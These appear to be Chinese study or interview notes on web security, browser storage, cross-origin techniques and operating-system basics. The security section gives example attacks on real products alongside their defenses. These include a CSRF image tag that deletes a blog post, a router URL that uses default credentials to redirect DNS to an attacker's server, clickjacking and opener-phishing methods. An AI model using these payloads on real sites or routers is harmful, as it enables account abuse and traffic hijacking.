当用户登录a.com后，又打开了http://b.com/b.html，其中有下面的内容：

<img src="http://a.com/blog/delete?id=1"/>
这时会以用户在a.com的身份发送http://a.com/blog/delete?id=1，删除那篇博客。

CSRF的防御
验证码
CSRF是在用户不知情的情况下构造的网络情况，验证码则强制用户与应用交互，所以验证码可以很好得防止CSRF。但不能什么请求都加验证码。

referer检查
检查请求header中的referer也能帮助防止CSRF攻击，但服务器不是总能拿到referer，浏览器可能出于安全或隐私而不发送referer，所以也不常用。倒是图片防盗链中用得很多。

Anti CSRF Token
更多的是生成一个随机的token，在用户提交数据的同时提交这个token，服务器端比对后如果不正确，则拒绝执行操作。

四、点击劫持（ClickJacking）
点击劫持是从视觉上欺骗用户。攻击者使用一个透明的iframe覆盖在一个网页上，诱使用户在该网页上操作，而实际点击却是点在透明的iframe页面。

点击劫持延伸出了很多攻击方式，有图片覆盖攻击、拖拽劫持等。

点击劫持的防御
针对iframe的攻击，可使用一个HTTP头：X-Frame-Options，它有三种可选值：

DENY： 禁止任何页面的frame加载；
SAMEORIGIN：只有同源页面的frame可加载；
ALLOW-FROM：可定义允许frame加载的页面地址。
针对图片覆盖攻击，则注意使用预防XSS的方法，防止HTML和JS注入。











0x00 禁止一切外链资源
外链会产生站外请求，因此可以被利用实施 CSRF 攻击。
目前国内有大量路由器存在 CSRF 漏洞，其中相当部分用户使用默认的管理账号。通过外链图片，即可发起对路由器 DNS 配置的修改，这将成为国内互联网最大的安全隐患。
案例演示
百度旅游在富文本过滤时，未考虑标签的 style 属性，导致允许用户自定义的 CSS。因此可以插入站外资源：
enter image description here
所有浏览该页面的用户，都能发起任意 URL 的请求：
enter image description here
由于站外服务器完全不受控制，攻击者可以控制返回内容： 如果检测到是管理员，或者外链检查服务器，可以返回正常图片； 如果是普通用户，可以返回 302 重定向到其他 URL，发起 CSRF 攻击。例如修改路由器 DNS：
http://admin:admin@192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&lcpMru=1480&ServiceName=&AcName=&EchoReq=0&manual=2&dnsserver=黑客服务器&dnsserver2=4.4.4.4&downBandwidth=0&upBandwidth=0&Save=%B1%A3+%B4%E6&Advanced=Advanced
enter image description here
演示中，随机测试了几个帖子，在两天时间里收到图片请求 500 多次，已有近 10 个不同的 IP 开始向我们发起 DNS 查询。
enter image description here
通过中间人代理，用户的所有隐私都能被捕捉到。还有更严重的后果，查考流量劫持危害探讨
要是在热帖里『火前留名』，那么数量远不止这些。
如果使用发帖脚本批量回复，将有数以万计的用户网络被劫持。
防范措施
杜绝用户的一切外链资源。需要站外图片，可以抓回后保存在站内服务器里。 对于富文本内容，使用白名单策略，只允许特定的 CSS 属性。 尽可能开启 Content Security Policy 配置，让浏览器底层来实现站外资源的拦截。
0x01 富文本前端扫描
富文本是 XSS 的重灾区。
富文本的实质是一段 HTML 字符。由于历史原因，HTML 兼容众多不规范的用法，导致过滤起来较复杂。几乎所有使用富文本的产品，都曾出现过 XSS 注入。
案例演示
旅游发帖支持富文本，我们继续刚才的演示。
enter image description here
由于之前已修复过几次，目前只能注入 embed 标签和 src 属性。 但即使这样，仍然可以嵌入一个框架页面：
enter image description here
因为是非同源执行的 XSS，所以无法获取主页面的信息。但是可以修改 top.location，将页面跳转到第三方站点。
将原页面嵌入到全屏的 iframe 里，伪造出相同的界面。然后通过浮层登录框，进行钓鱼。
enter image description here
总之，富文本中出现可执行的元素，页面安全性就大打折扣了。
防范措施
这里不考虑后端的过滤方法，讲解使用前端预防方案： 无论攻击者使用各种取巧的手段，绕过后端过滤，但这些 HTML 字符最终都要在前端构造成元素，并渲染出来。
因此可以在 DOM 构造之后、渲染之前，对离屏的元素进行风险扫描。将可执行的元素（script，iframe，frame，object，embed，applet）从缓存中移除。
或者给存在风险的元素，加上沙箱隔离属性。
例如 iframe 加上 sandbox 属性，即可只显示框架内容而不运行脚本 例如 Flash 加上 allowScriptAccess 及 allowNetworking，也能起到一定的隔离作用。
DOM 仅仅被构造是不会执行的，只有添加到主节点被渲染时才会执行。所以这个过程中间，可以实施安全扫描。
实现细节可以参考：http://www.etherdream.com/FunnyScript/richtextsaferender.html
如果富文本是直接输入到静态页面里的，可以考虑使用 MutationEvent 进行防御。详细参考：http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-2/
但推荐使用动态方式进行渲染，可扩展性更强，并且性能消耗最小。
0x02 跳转 opener 钓鱼
浏览器提供了一个 opener 属性，供弹出的窗口访问来源页。但该规范设计的并不合理，导致通过超链接打开的页面，也能使用 opener。
因此，用户点了网站里的超链接，导致原页面被打开的第三方页面控制。
虽然两者受到同源策略的限制，第三方无法访问原页面内容，但可以跳转原页面。
由于用户的焦点在新打开的页面上，所以原页面被悄悄跳转，用户难以觉察到。当用户切回原页面时，其实已经在另一个钓鱼网站上了。
案例演示
百度贴吧目前使用的超链接，就是在新窗口中弹出，因此同样存在该缺陷。
攻击者发一个吸引用户的帖子。当用户进来时，引诱他们点击超链接。
通常故意放少部分的图片，或者是不会动的动画，先让用户预览一下。要是用户想看完整的，就得点下面的超链接：
enter image description here
由于扩展名是 gif 等图片格式，大多用户就毫无顾虑的点了。
事实上，真正的类型是由服务器返回的 MIME 决定的。所以这个站外资源完全有可能是一个网页：
enter image description here
当用户停留在新页面里看动画时，隐匿其中的脚本已悄悄跳转原页面了。
用户切回原页面时，其实已在一个钓鱼网站上：
enter image description here
在此之上，加些浮层登录框等特效，很有可能钓到用户的一些账号信息。
防范措施
该缺陷是因为 opener 这个属性引起的，所以得屏蔽掉新页面的这个属性。
但通过超链接打开的网页，无法被脚本访问到。只有通过 window.open 弹出的窗口，才能获得其对象。
所以，对页面中的用户发布的超链接，监听其点击事件，阻止默认的弹窗行为，而是用 window.open 代替，并将返回窗体的 opener 设置为 null，即可避免第三方页面篡改了。
详细实现参考：http://www.etherdream.com/FunnyScript/opener_protect.html
当然，实现中无需上述 Demo 那样复杂。根据实际产品线，只要监听用户区域的超链接就可以。
0x03 用户内容权限
支持自定义装扮的场合，往往是钓鱼的高发区。
一些别有用心者，利用装扮来模仿系统界面，引诱用户上钩。
案例演示 - 空间越界
百度空间允许用户撰写自定格式的内容。
其本质是一个富文本编辑器，这里不演示 XSS 漏洞，而是利用样式装扮，伪装一个钓鱼界面。
百度空间富文本过滤元素、部分属性及 CSS 样式，但未对 class 属性启用白名单，因此可以将页面上所有的 CSS 类样式，应用到自己的内容上来。
enter image description here
防范措施
规定用户内容尺寸限制，可以在提交时由用户自己确定。
不应该为用户的内容分配无限的尺寸空间，以免恶意用户设置超大字体，破坏整个页面的浏览。
最好将用户自定义的内容嵌套在 iframe 里，以免影响到页面其他部位。
如果必须在同页面，应将用户内容所在的容器，设置超过部分不可见。以免因不可预测的 BUG，导致用户能将内容越界到产品界面上。
案例演示 - 功能越界
自定义装扮通常支持站外超链接。
相比贴吧这类简单纯文字，富文本可以将超链接设置在其他元素上，例如图片。
因此这类链接非常具有迷惑性，用户不经意间就点击到。很容易触发之前提到的修改 opener 钓鱼。
enter image description here
如果在图片内容上进行伪装，更容易让用户触发一些危险操作。
enter image description here
要是和之前的区域越界配合使用，迷惑性则更强：
enter image description here
enter image description here
防范措施
和之前一样，对于用户提供的超链接，在点击时进行扫描。如果是站外地址，则通过后台跳转进入，以便后端对 URL 进行安全性扫描。
如果服务器检测到是一个恶意网站，或者目标资源是可执行文件，应给予用户强烈的警告，告知其风险。
0x04 点击劫持检测
点击劫持算是比较老的攻击方式了，基本原理大家也都听说过。就是在用户不知情的前提下，点击隐藏框架页面里的按钮，触发一些重要操作。
但目前在点击劫持上做防御的并不多，包括百度绝大多数产品线目前都未考虑。
案例演示
能直接通过点击完成的操作，比较有意义的就是关注某用户。例如百度贴吧加关注的按钮：
enter image description here
攻击者事先算出目标按钮的尺寸和坐标，将页面嵌套在自己框架里，并设置框架的偏移，最终只显示按钮：
enter image description here
接着通过 CSS 样式，将目标按钮放大，占据整个页面空间，并设置全透明。
enter image description here
这时虽看不到按钮，但点击页面任意位置，都能触发框架页中加关注按钮的点击：
enter image description here
防范措施
事实上，点击劫持是很好防御的。
因为自身页面被嵌套在第三方页面里，只需判断 self == top 即可获知是否被嵌套。
对一些重要的操作，例如加关注、删帖等，应先验证是否被嵌套。如果处于第三方页面的框架里，应弹出确认框提醒用户。
确认框的坐标位置最好有一定的随机偏移，从而使攻击者构造的点击区域失效。
3.本地存储
1.请你谈谈Cookie的弊端

cookie虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。 第一：每个特定的域名下最多生成20个cookie

1.IE6或更低版本最多20个cookie
2.IE7和之后的版本最后可以有50个cookie。
3.Firefox最多50个cookie
4.chrome和Safari没有做硬性限制

IE和Opera 会清理近期最少使用的cookie，Firefox会随机清理cookie。

cookie的最大大约为4096字节，为了兼容性，一般不能超过4095字节。

IE 提供了一种存储可以持久化用户数据，叫做uerData，从IE5.0就开始支持。每个数据最多128K，每个域名下最多1M。这个持久化数据放在缓存中，如果缓存没有清理，那么会一直存在。
优点：极高的扩展性和可用性

1.通过良好的编程，控制保存在cookie中的session对象的大小。
2.通过加密和安全传输技术（SSL），减少cookie被破解的可能性。
3.只在cookie中存放不敏感数据，即使被盗也不会有重大损失。
4.控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。

缺点：

1.`Cookie`数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。

2.安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。

3.有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。

2.浏览器本地存储

在较高版本的浏览器中，js提供了sessionStorage和globalStorage。在HTML5中提供了localStorage来取代globalStorage。

html5中的Web Storage包括了两种存储方式：sessionStorage和localStorage。

sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。

而localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。
3.web storage和cookie的区别

Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。

除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。

但是Cookie也是不可以或缺的：Cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生

浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的UserData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。

localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等
4.跨域
跨域:

浏览器对于javascript的同源策略的限制,例如a.cn下面的js不能调用b.cn中的js,对象或数据(因为a.cn和b.cn是不同域),所以跨域就出现了.


同源策略:

请求的url地址,必须与浏览器上的url地址处于同域上,也就是域名,端口,协议相同.

比如:我在本地上的域名是study.cn,请求另外一个域名一段数据

jsonp:

	jsonp 全称是JSON with Padding,是为了解决跨域请求资源而产生的解决方案,是一种依靠开发人员创造出的一种非官方跨域数据交互协议。

	一个是描述信息的格式，一个是信息传递双方约定的方法。

	jsonp的产生:

	1.AJAX直接请求普通文件存在跨域无权限访问的问题,不管是静态页面也好.

	2.不过我们在调用js文件的时候又不受跨域影响,比如引入jquery框架的,或者是调用相片的时候

	3.凡是拥有scr这个属性的标签都可以跨域例如<script><img><iframe>

	4.如果想通过纯web端跨域访问数据只有一种可能,那就是把远程服务器上的数据装进js格式的文件里.

	5.而json又是一个轻量级的数据格式,还被js原生支持

	6.为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个callback 参数给服务端，


iframe跨域


	基于iframe实现的跨域要求两个域具有aa.xx.com,bb.xx.com 这种特点，

	也就是两个页面必须属于一个基础域（例如都是xxx.com)，使用同一协议和同一端口，这样在两个页面中同时添加document.domain，就可以实现父页面调用子页面的函数

	要点就是 :通过修改document.domain来跨子域


服务器端跨域

	因为服务器端程序是不存在跨域问题

	也是利用src加载跨域的文件


使用HTML5中window.postMessage方法

	window.postMessage(message,targetOrigin)  方法是html5新引进的特性，可以使用它来向其它的window对象发送消息，无论这个window对象是属于同源或不同源，目前IE8+、FireFox、Chrome、Opera等浏览器都已经支持window.postMessage方法。

	调用postMessage方法的window对象是指要接收消息的那一个window对象，该方法的第一个参数message为要发送的消息，类型只能为字符串；第二个参数targetOrigin用来限定接收消息的那个window对象所在的域，如果不想限定域，可以使用通配符 *  。

	需要接收消息的window对象，可是通过监听自身的message事件来获取传过来的消息，消息内容储存在该事件对象的data属性中。

	上面所说的向其他window对象发送消息，其实就是指一个页面有几个框架的那种情况，因为每一个框架都有一个window对象。在讨论第二种方法的时候，我们说过，不同域的框架间是可以获取到对方的window对象的，而且也可以使用window.postMessage这个方法。


使用window.name来进行跨域

	window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。


cros跨域资源共享

http头加 Access-Control-Allow-Origin字段
5.内核
Trident内核：IE最先开发或使用的，也称IE内核，360浏览器使用的也是IE内核；
2、Webkit内核：谷歌chrome浏览器最先开发或使用，也叫谷歌内核，枫树浏览器、太阳花使用的也是谷歌内核；
3、Gecko内核： Netscape6开始采用的内核，后来的Mozilla FireFox (火狐浏览器)也采用了该内核，K-Meleon浏览器也是使用这种内核；
4、Presto内核：目前只有Opera浏览器采用该内核
21.操作系统
1. Linux
Linux中常用到的命令

　　显示文件目录命令ls        如ls

　　改变当前目录命令cd        如cd /home

　　建立子目录mkdir           如mkdir xiong

　　删除子目录命令rmdir       如rmdir /mnt/cdrom

　　删除文件命令rm            如rm /ucdos.bat

　　文件复制命令cp            如cp /ucdos /fox

　　获取帮助信息命令man      如man ls

　　显示文件的内容less        如less mwm.lx

　　重定向与管道type          如type readme>>direct，将文件readme的内容追加到文direct中

10、Linux文件属性有哪些？（共十位）

　　-rw-r--r--那个是权限符号，总共是- --- --- ---这几个位。

　　第一个短横处是文件类型识别符：-表示普通文件；c表示字符设备（character）；b表示块设备（block）；d表示目录（directory）；l表示链接文件（link）；后面第一个三个连续的短横是用户权限位（User），第二个三个连续短横是组权限位（Group），第三个三个连续短横是其他权限位（Other）。每个权限位有三个权限，r（读权限），w（写权限），x（执行权限）。如果每个权限位都有权限存在，那么满权限的情况就是：-rwxrwxrwx；权限为空的情况就是- --- --- ---。

　　权限的设定可以用chmod命令，其格式位：chmod ugoa+/-/=rwx filename/directory。例如：

　　一个文件aaa具有完全空的权限- --- --- ---。

　　chmod u+rw aaa（给用户权限位设置读写权限，其权限表示为：- rw- --- ---）

　　chmod g+r aaa（给组设置权限为可读，其权限表示为：- --- r-- ---）

　　chmod ugo+rw aaa（给用户，组，其它用户或组设置权限为读写，权限表示为：- rw- rw- rw-）

　　如果aaa具有满权限- rwx rwx rwx。

　　chmod u-x aaa（去掉用户可执行权限，权限表示为：- rw- rwx rwx）

　　如果要给aaa赋予制定权限- rwx r-x r-x，命令为：

chmod u=rwx，Go=rx aaa

2.操作系统
　Windows下的内存是如何管理的？

　　Windows提供了3种方法来进行内存管理：虚拟内存，最适合用来管理大型对象或者结构数组；内存映射文件，最适合用来管理大型数据流（通常来自文件）以及在单个计算机上运行多个进程之间共享数据；内存堆栈，最适合用来管理大量的小对象。

　　Windows操纵内存可以分两个层面：物理内存和虚拟内存。

　　其中物理内存由系统管理，不允许应用程序直接访问，应用程序可见的只有一个2G地址空间，而内存分配是通过堆进行的。对于每个进程都有自己的默认堆，当一个堆创建后，就通过虚拟内存操作保留了相应大小的地址块（不占有实际的内存，系统消耗很小）。当在堆上分配一块内存时，系统在堆的地址表里找到一个空闲块（如果找不到，且堆创建属性是可扩充的，则扩充堆大小），为这个空闲块所包含的所有内存页提交物理对象（在物理内存上或硬盘的交换文件上），这时就可以访问这部分地址。提交时，系统将对所有进程的内存统一调配，如果物理内存不够，系统试图把一部分进程暂时不访问的页放入交换文件，以腾出部分物理内存。释放内存时，只在堆中将所在的页解除提交（相应的物理对象被解除），继续保留地址空间。

　　如果要知道某个地址是否被占用/可不可以访问，只要查询此地址的虚拟内存状态即可。如果是提交，则可以访问。如果仅仅保留，或没保留，则产生一个软件异常。此外，有些内存页可以设置各种属性。如果是只读，向内存写也会产生软件异常。

、Windows消息调度机制是 消息队列


　　处理消息队列的顺序。首先Windows绝对不是按队列先进先出的次序来处理的，而是有一定优先级的。优先级通过消息队列的状态标志来实现的。首先，最高优先级的是别的线程发过来的消息（通过sendmessage）；其次，处理登记消息队列消息；再次处理QS_QUIT标志，处理虚拟输入队列，处理wm_paint；最后是wm_timer。


　　描述实时系统的基本特性


　　在特定时间内完成特定的任务，实时性与可靠性。
　　所谓“实时操作系统”，实际上是指操作系统工作时，其各种资源可以根据需要随时进行动态分配。由于各种资源可以进行动态分配，因此，其处理事务的能力较强、速度较快。


　　中断和轮询的特点


　　对I/O设备的程序轮询的方式，是早期的计算机系统对I/O设备的一种管理方式。它定时对各种设备轮流询问一遍有无处理要求。轮流询问之后，有要求的，则加以处理。在处理I/O设备的要求之后，处理机返回继续工作。尽管轮询需要时间，但轮询要比I/O设备的速度要快得多，所以一般不会发生不能及时处理的问题。当然，再快的处理机，能处理的输入输出设备的数量也是有一定限度的。而且，程序轮询毕竟占据了CPU相当一部分处理时间，因此，程序轮询是一种效率较低的方式，在现代计算机系统中已很少应用。

　　程序中断通常简称中断，是指CPU在正常运行程序的过程中，由于预先安排或发生了各种随机的内部或外部事件，使CPU中断正在运行的程序，而转到为响应的服务程序去处理。

　　轮询——效率低，等待时间很长，CPU利用率不高。

　　中断——容易遗漏一些问题，CPU利用率高。



什么是临界区？如何解决冲突？



　　每个进程中访问临界资源的那段程序称为临界区，每次只准许一个进程进入临界区，进入后不允许其他进程进入。

　　（1）如果有若干进程要求进入空闲的临界区，一次仅允许一个进程进入；

　　（2）任何时候，处于临界区内的进程不可多于一个。如已有进程进入自己的临界区，则其它所有试图进入临界区的进程必须等待；

　　（3）进入临界区的进程要在有限时间内退出，以便其它进程能及时进入自己的临界区；

　　（4）如果进程不能进入自己的临界区，则应让出CPU，避免进程出现“忙等”现象。


说说分段和分页



　　页是信息的物理单位，分页是为实现离散分配方式，以消减内存的外零头，提高内存的利用率；或者说，分页仅仅是由于系统管理的需要，而不是用户的需要。

　　段是信息的逻辑单位，它含有一组其意义相对完整的信息。分段的目的是为了能更好的满足用户的需要。

　　页的大小固定且由系统确定，把逻辑地址划分为页号和页内地址两部分，是由机器硬件实现的，因而一个系统只能有一种大小的页面。段的长度却不固定，决定于用户所编写的程序，通常由编辑程序在对源程序进行编辑时，根据信息的性质来划分。

　　分页的作业地址空间是一维的，即单一的线性空间，程序员只须利用一个记忆符，即可表示一地址。分段的作业地址空间是二维的，程序员在标识一个地址时，既需给出段名，又需给出段内地址。



makefile文件的作用是什么？



　　一个工程中的源文件不计其数，其按类型、功能、模块分别放在若干个目录中。makefile定义了一系列的规则来指定哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作。因为makefile就像一个Shell脚本一样，其中也可以执行操作系统的命令。makefile带来的好处就是——“自动化编译”。一旦写好，只需要一个make命令，整个工程完全自动编译，极大地提高了软件开发的效率。make是一个命令工具，是一个解释makefile中指令的命令工具。一般来说，大多数的IDE都有这个命令，比如：Delphi的make，Visual C++的nmake，Linux下GNU的make。可见，makefile都成为了一种在工程方面的编译方法。


　简术OSI的物理层Layer1，链路层Layer2，网络层Layer3的任务。


　　网络层：通过路由选择算法，为报文或分组通过通信子网选择最适当的路径。

　　链路层：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。

　　物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。



　什么是中断？中断时CPU做什么工作？

　　中断是指在计算机执行期间，系统内发生任何非寻常的或非预期的急需处理事件，使得CPU暂时中断当前正在执行的程序而转去执行相应的事件处理程序。待处理完毕后又返回原来被中断处继续执行或调度新的进程执行的过程。



　　你知道操作系统的内容分为几块吗？什么叫做虚拟内存？他和主存的关系如何？内存管理属于操作系统的内容吗？


　　操作系统的主要组成部分：进程和线程的管理，存储管理，设备管理，文件管理。虚拟内存是一些系统页文件，存放在磁盘上，每个系统页文件大小为4K，物理内存也被分页，每个页大小也为4K，这样虚拟页文件和物理内存页就可以对应，实际上虚拟内存就是用于物理内存的临时存放的磁盘空间。页文件就是内存页，物理内存中每页叫物理页，磁盘上的页文件叫虚拟页，物理页+虚拟页就是系统所有使用的页文件的总和。




　　什么是缓冲区溢出？有什么危害？其原因是什么？

　　缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。

　　危害：在当前网络与分布式系统安全中，被广泛利用的50%以上都是缓冲区溢出，其中最著名的例子是1988年利用fingerd漏洞的蠕虫。而缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害一种是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。

　　造成缓冲区溢出的主原因是程序中没有仔细检查用户输入的参数。


程序


计算机指令的集合，它以文件的形式存储在磁盘上。程序是静态实体（passive Entity），在多道程序系统中，它是不能独立运行的，更不能与其他程序并发执行
不使用【程序不能申请系统资源，不能被系统调度，也不能作为独立运行的单位，因此，它不占用系统的运行资源】。



进程


通常被定义为一个正在运行的程序的实例，是一个程序在其自身的地址空间中的一次执行活动。

定义：进程是进程实体（包括：程序段、相关的数据段、进程控制块PCB）的运行过程，是系统进行资源分配和调度的一个独立单位。


使用【进程是资源申请、调度和独立运行的单位，因此，它使用系统中的运行资源。】




　　高级通信机制可归结为三大类：

　　（1）共享存储器系统（存储器中划分的共享存储区）；实际操作中对应的是“剪贴板”（剪贴板实际上是系统维护管理的一块内存区域）的通信方式，比如举例如下：word进程按下ctrl+c，在ppt进程按下ctrl+v，即完成了word进程和ppt进程之间的通信，复制时将数据放入到剪贴板，粘贴时从剪贴板中取出数据，然后显示在ppt窗口上。

　　（2）消息传递系统（进程间的数据交换以消息（message）为单位，当今最流行的微内核操作系统中，微内核与服务器之间的通信，无一例外地都采用了消息传递机制。应用举例：邮槽（MailSlot）是基于广播通信体系设计出来的，它采用无连接的不可靠的数据传输。邮槽是一种单向通信机制，创建邮槽的服务器进程读取数据，打开邮槽的客户机进程写入数据。

　　（3）管道通信系统（管道即：连接读写进程以实现他们之间通信的共享文件（pipe文件，类似先进先出的队列，由一个进程写，另一进程读））。实际操作中，管道分为：匿名管道、命名管道。匿名管道是一个未命名的、单向管道，通过父进程和一个子进程之间传输数据。匿名管道只能实现本地机器上两个进程之间的通信，而不能实现跨网络的通信。命名管道不仅可以在本机上实现两个进程间的通信，还可以跨网络实现两个进程间的通信。
3.进程与线程
什么是进程（Process）和线程（Thread）？有何区别？

　　进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动，进程是系统进行资源分配和调度的一个独立单位。线程是进程的一个实体，是CPU调度和分派的基本单位，它是比进程更小的能独立运行的基本单位。线程自己基本上不拥有系统资源，只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行。

　　进程与应用程序的区别在于应用程序作为一个静态文件存储在计算机系统的硬盘等存储空间中，而进程则是处于动态条件下由操作系统维护的系统资源管理实体。


程序和进程

　　进程由两个部分组成：1）操作系统用来管理进程的内核对象。内核对象也是系统用来存放关于进程的统计信息的地方。2）地址空间。它包含所有可执行模块或DLL模块的代码和数据。它还包含动态内存分配的空间。如线程堆栈和堆分配空间。


4、进程间的通信是如何实现的？

　　进程通信，是指进程之间的信息交换（信息量少则一个状态或数值，多者则是成千上万个字节）。因此，对于用信号量进行的进程间的互斥和同步，由于其所交换的信息量少而被归结为低级通信。

　　所谓高级进程通信指：用户可以利用操作系统所提供的一组通信命令传送大量数据的一种通信方式。操作系统隐藏了进程通信的实现细节。或者说，通信过程对用户是透明的。


说出你所知道的保持进程同步的方法？

　　进程间同步的主要方法有原子操作、信号量机制、自旋锁、管程、会合、分布式系统等	。进程同步

　　进程同步的主要任务：是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。

　　同步机制遵循的原则：

　　（1）空闲让进；

　　（2）忙则等待（保证对临界区的互斥访问）；

　　（3）有限等待（有限代表有限的时间，避免死等）；

　　（4）让权等待，（当进程不能进入自己的临界区时，应该释放处理机，以免陷入忙等状态）。





线程是否具有相同的堆栈？dll是否有独立的堆栈？

　　每个线程有自己的堆栈。

　　dll是否有独立的堆栈？这个问题不好回答，或者说这个问题本身是否有问题。因为dll中的代码是被某些线程所执行，只有线程拥有堆栈。如果dll中的代码是exe中的线程所调用，那么这个时候是不是说这个dll没有独立的堆栈？如果dll中的代码是由dll自己创建的线程所执行，那么是不是说dll有独立的堆栈？

　　以上讲的是堆栈，如果对于堆来说，每个dll有自己的堆，所以如果是从dll中动态分配的内存，最好是从dll中删除；如果你从dll中分配内存，然后在exe中，或者另外一个dll中删除，很有可能导致程序崩溃。
4.死锁
　17、什么是死锁？其条件是什么？怎样避免死锁？

　　死锁的概念：在两个或多个并发进程中，如果每个进程持有某种资源而又都等待别的进程释放它或它们现在保持着的资源，在未改变这种状态之前都不能向前推进，称这一组进程产生了死锁。通俗地讲，就是两个或多个进程被无限期地阻塞、相互等待的一种状态。

　　死锁产生的原因主要是：？ 系统资源不足；？ 进程推进顺序非法。

　　产生死锁的必要条件：

　　（1）互斥（mutualexclusion），一个资源每次只能被一个进程使用；

　　（2）不可抢占（nopreemption），进程已获得的资源，在未使用完之前，不能强行剥夺；

　　（3）占有并等待（hold andwait），一个进程因请求资源而阻塞时，对已获得的资源保持不放；

　　（4）环形等待（circularwait），若干进程之间形成一种首尾相接的循环等待资源关系。

　　这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之一不满足，就不会发生死锁。

　　死锁的解除与预防：理解了死锁的原因，尤其是产生死锁的四个必要条件，就可以最大可能地避免、预防和解除死锁。所以，在系统设计、进程调度等方面注意如何不让这四个必要条件成立，如何确定资源的合理分配算法，避免进程永久占据系统资源。此外，也要防止进程在处于等待状态的情况下占用资源。因此，对资源的分配要给予合理的规划。

死锁的处理策略：鸵鸟策略、预防策略、避免策略、检测与恢复策略。
5.文件系统
常见的操作系统使用的文件系统整理

	文件系统是操作系统用于明确磁盘或分区上的文件的方法和数据结构；即在磁盘上组织文件的方法。也指用于存储文件的磁盘或分区，或文件系统种类。操作系统中负责管理和存储文件信息的软件机构称为文件管理系统，简称文件系统。文件系统由三部分组成：与文件管理有关软件、被管理文件以及实施文件管理所需数据结构。从系统角度来看，文件系统是对文件存储器空间进行组织和分配，负责文件存储并对存入的文件进行保护和检索的系统。具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。
【FAT】：

　　常PC机使用的文件系统是FAT16。像基于MS-DOS，Win 95等系统都采用了FAT16文件系统。在Win 9X下，FAT16支持的分区最大为2GB。我们知道计算机将信息保存在硬盘上称为“簇”的区域内。使用的簇越小，保存信息的效率就越高。在FAT16的情况下，分区越大簇就相应的要大，存储效率就越低，势必造成存储空间的浪费。并且随着计算机硬件和应用的不断提高，FAT16文件系统已不能很好地适应系统的要求。在这种情况下，推出了增强的文件系统FAT32。同FAT16相比，FAT32主要具有以下特点：

　　1、同FAT16相比FAT32最大的优点是可以支持的磁盘大小达到32G，但是不能支持小于512MB的分区。

　　*基于FAT32的Win 2000可以支持分区最大为32GB；而基于 FAT16的Win 2000支持的分区最大为4GB。

　　2、由于采用了更小的簇，FAT32文件系统可以更有效率地保存信息。如两个分区大小都为2GB，一个分区采用了FAT16文件系统，另一个分区采用了FAT32文件系统。采用FAT16的分区的簇大小为32KB，而FAT32分区的簇只有4KB的大小。这样FAT32就比FAT16的存储效率要高很多，通常情况下可以提高15%。

　　3、FAT32文件系统可以重新定位根目录和使用FAT的备份副本。另外FAT32分区的启动记录被包含在一个含有关键数据的结构中，减少了计算机系统崩溃的可能性。

　　【NTFS】：

　　NTFS文件系统是一个基于安全性的文件系统，是Windows NT所采用的独特的文件系统结构，它是建立在保护文件和目录数据基础上，同时照顾节省存储资源、减少磁盘占用量的一种先进的文件系统。使用非常广泛的Windows NT 4.0采用的就是NTFS 4.0文件系统，相信它所带来的强大的系统安全性一定给广大用户留下了深刻的印象。Win 2000采用了更新版本的NTFS文件系统？？NTFS 5.0，它的推出使得用户不但可以像Win 9X那样方便快捷地操作和管理计算机，同时也可享受到NTFS所带来的系统安全性。

　　NTFS 5.0的特点主要体现在以下几个方面：

　　1、NTFS可以支持的分区（如果采用动态磁盘则称为卷）大小可以达到2TB。而Win 2000中的FAT32支持分区的大小最大为32GB。

